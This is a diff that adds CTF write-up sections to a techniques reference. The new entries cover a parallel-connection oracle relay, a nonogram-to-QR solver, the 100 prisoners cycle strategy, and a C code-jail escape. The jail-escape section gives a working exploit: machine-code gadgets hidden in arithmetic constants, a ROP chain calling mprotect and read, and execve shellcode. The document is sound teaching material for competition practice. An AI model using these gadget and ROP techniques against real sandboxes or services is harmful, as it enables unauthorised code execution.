@@ -25,6 +25,10 @@
 - [References](#references)
 - [Python Marshal Code Injection (iCTF 2013)](#python-marshal-code-injection-ictf-2013)
 - [Benford's Law Frequency Distribution Bypass (iCTF 2013)](#benfords-law-frequency-distribution-bypass-ictf-2013)
+- [Parallel Connection Oracle Relay (Hack.lu 2015)](#parallel-connection-oracle-relay-hacklu-2015)
+- [Nonogram Solver to QR Code Pipeline (SECCON 2015)](#nonogram-solver-to-qr-code-pipeline-seccon-2015)
+- [100 Prisoners Problem / Cycle-Following Strategy (Sharif CTF 2016)](#100-prisoners-problem--cycle-following-strategy-sharif-ctf-2016)
+- [C Code Jail Escape via Emoji Identifiers and Gadget Embedding (Midnight Flag 2026)](#c-code-jail-escape-via-emoji-identifiers-and-gadget-embedding-midnight-flag-2026)
 
 ---
 
@@ -504,6 +508,189 @@ def generate_benford_compliant(length=1000):
 ```
 
 **Key insight:** Benford's Law describes the frequency of leading digits in naturally occurring datasets. If a service validates digit distribution, generate compliant input rather than random numbers. Tolerance is typically ±5%, so approximate percentages work.
+
+---
+
+## Parallel Connection Oracle Relay (Hack.lu 2015)
+
+When a server generates deterministic sequences and provides feedback, exploit multiple simultaneous connections to share answers:
+
+1. Open N+1 connections with identical timing (same PRNG seed)
+2. Sacrifice one connection per round to discover the correct answer
+3. Relay discovered answer to remaining connections via synchronization
+
+```python
+import threading
+
+NUM_CONNECTIONS = 101
+barriers = [threading.Barrier(NUM_CONNECTIONS - i) for i in range(100)]
+correct_answers = [None] * 100
+
+def worker(index, sock):
+    for round_num in range(100):
+        barriers[round_num].wait()  # Synchronize all threads
+
+        if index == round_num:
+            # This thread sacrifices itself to probe
+            for guess in range(100):
+                sock.send(str(guess).encode())
+                response = sock.recv(1024)
+                if b'correct' in response:
+                    correct_answers[round_num] = guess
+                    break
+        else:
+            # Wait for oracle thread to find answer
+            barriers[round_num].wait()
+            sock.send(str(correct_answers[round_num]).encode())
+
+threads = [threading.Thread(target=worker, args=(i, connections[i])) for i in range(NUM_CONNECTIONS)]
+for t in threads: t.start()
+```
+
+**Key insight:** Works against any service where multiple connections share state (same PRNG seed from identical connection times). The sacrifice pattern ensures at least one connection survives all rounds.
+
+---
+
+## Nonogram Solver to QR Code Pipeline (SECCON 2015)
+
+Automate solving nonogram puzzles that produce QR codes:
+
+1. **Parse constraints** from web interface (BeautifulSoup for HTML tables)
+2. **Solve nonogram** using external solver or constraint propagation
+3. **Render to image** and decode QR
+
+```python
+from PIL import Image
+import subprocess, qrtools
+
+# Parse row/column constraints from HTML
+rows = parse_constraints(html, 'rows')   # [[3,1], [2,2], ...]
+cols = parse_constraints(html, 'cols')
+
+# Feed to nonogram solver (e.g., nonogram-0.9)
+solver_input = format_for_solver(rows, cols)
+result = subprocess.run(['./nonogram'], input=solver_input, capture_output=True)
+
+# Convert text grid to QR image
+grid = parse_solver_output(result.stdout)
+cell_size = 10
+img = Image.new('RGB', (len(grid[0]) * cell_size, len(grid) * cell_size), 'white')
+# Draw black cells where grid == '#'
+
+# Decode QR
+qr = qrtools.QR()
+qr.decode('qrcode.png')
+answer = qr.data
+```
+
+**Key insight:** Nonogram solvers are available as command-line tools. The key challenge is parsing the web interface and converting output to a valid QR image. Add quiet zones (white border) around the QR for reliable decoding.
+
+---
+
+## 100 Prisoners Problem / Cycle-Following Strategy (Sharif CTF 2016)
+
+The classic 100 prisoners problem appears in CTF challenges as an "impossible" probability game:
+
+- N prisoners each open N/2 boxes looking for their number
+- All must succeed for the group to win
+- Optimal strategy: follow permutation cycles (success rate ~31%)
+
+```python
+def solve_prisoners(boxes):
+    """Follow cycle starting from own number"""
+    N = len(boxes)
+    results = []
+    for prisoner in range(N):
+        current = prisoner
+        found = False
+        for _ in range(N // 2):
+            if boxes[current] == prisoner:
+                found = True
+                break
+            current = boxes[current]  # Follow the cycle
+        results.append(found)
+    return all(results)
+```
+
+**Key insight:** Random strategy succeeds with probability (1/2)^N ≈ 0. Cycle-following succeeds with probability 1 - ln(2) ≈ 0.3069 for large N. The game fails only if any cycle exceeds length N/2. Pre-check cycle lengths if the box arrangement is known.
+
+---
+
+## C Code Jail Escape via Emoji Identifiers and Gadget Embedding (Midnight Flag 2026)
+
+Escape a C code jail that bans all alphanumeric characters, whitespace, and most operators by using GCC's Unicode identifier support and embedding machine code gadgets inside arithmetic constants.
+
+**Constraints:** Only `(){}[];,=.+*%@#~` and emoji allowed. No letters, digits, whitespace, quotes, or `?&!|$<>^:/-`.
+
+### Step 1: Integer construction from emoji
+
+GCC allows emoji as identifiers. `(😃==😃)` is compile-time constant `1`. Build any integer via addition and multiplication:
+
+```c
+// Building 15: 3 * (2*2 + 1)
+((😃==😃)+(😃==😃)+(😃==😃))*(((😃==😃)+(😃==😃))*((😃==😃)+(😃==😃))+(😃==😃))
+```
+
+### Step 2: Embed gadgets via add eax constant encoding
+
+At `-O0`, `var = var + CONSTANT` compiles to `05 XX XX XX XX` (add eax, imm32). Jump to offset+1 to execute the constant bytes as instructions:
+
+| Target bytes | Instruction | Constant (decimal) |
+|---|---|---|
+| `0f 05 c3` | syscall; ret | 12780815 |
+| `58 c3` | pop rax; ret | 50008 |
+| `5f c3` | pop rdi; ret | 50015 |
+| `5a c3` | pop rdx; ret | 50010 |
+| `5e c3` | pop rsi; ret | 50014 |
+| `54 5e 0f 05` | push rsp; pop rsi; syscall | 84893268 |
+
+```c
+// Each gadget function embeds one instruction sequence:
+😇(){😼=😼+<12780815_as_emoji_expr>;}  // syscall; ret at 😇+15
+```
+
+### Step 3: Stack-based ROP via push rsp; pop rsi; syscall
+
+Call the `push rsp; pop rsi; syscall` gadget with `sys_read` args to write a ROP chain directly to the stack return address:
+
+```c
+// (gadget_func + 15)(stdin=0, buf=ignored_rsp_used, len=4096)
+😀(){(😃+<15_expr>)(😷,😸,<4096_expr>);}
+```
+
+The `push rsp` captures the return address location, `pop rsi` sets it as the read buffer, then `syscall` reads attacker input onto the stack.
+
+### Step 4: ROP chain to mprotect + read + shellcode
+
+```python
+from pwn import *
+
+rop = flat([
+    0xdeadbeef,      # consumed by pop rbp
+    POP_RAX, 10,     # sys_mprotect
+    POP_RDI, 0x404000,
+    POP_RSI, 0x2000,
+    POP_RDX, 7,      # PROT_READ|WRITE|EXEC
+    SYSCALL_RET,
+    POP_RAX, 0,      # sys_read
+    POP_RDI, 0,      # stdin
+    POP_RSI, 0x404020,
+    POP_RDX, 0x200,
+    SYSCALL_RET,
+    0x404020,         # jump to shellcode
+])
+```
+
+### Step 5: Shellcode with glob for unknown flag path
+
+```python
+# execve("/bin/sh", ["/bin/sh", "-c", "cat /flag*"], NULL)
+shellcode = asm(shellcraft.execve("/bin/sh", ["/bin/sh", "-c", "cat /flag*"]))
+```
+
+**Key insight:** GCC's `-static -nostartfiles -nostdlib` produces a minimal binary with deterministic addresses (no ASLR). Each emoji function lands at a predictable address (0x401000, 0x40101c, ...). The `add eax, imm32` encoding is the key primitive — any 4-byte gadget sequence can be embedded as an arithmetic constant in a valid C expression.
+
+**Compilation flags to watch for:** `-nostartfiles -nostdlib -static` indicates no libc, no CRT, deterministic layout — ideal for address-hardcoded exploits.
 
 ---
 
